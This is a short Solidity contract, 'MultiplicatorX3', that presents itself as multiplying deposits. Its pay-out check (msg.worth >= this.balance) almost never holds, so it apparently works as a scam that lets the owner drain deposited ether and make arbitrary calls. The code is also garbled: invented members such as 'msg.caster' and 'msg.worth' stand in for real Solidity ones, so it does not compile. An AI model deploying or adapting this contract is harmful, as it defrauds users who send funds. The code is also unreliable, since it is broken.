pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.caster;

    function() public payable{}

    function redeemTokens()
    payable
    public
    {
        require(msg.caster == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes details)
    payable
    public
    {
        require(msg.caster == Owner);
        adr.call.worth(msg.worth)(details);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.worth>=this.balance)
        {
            adr.transfer(this.balance+msg.worth);
        }
    }
}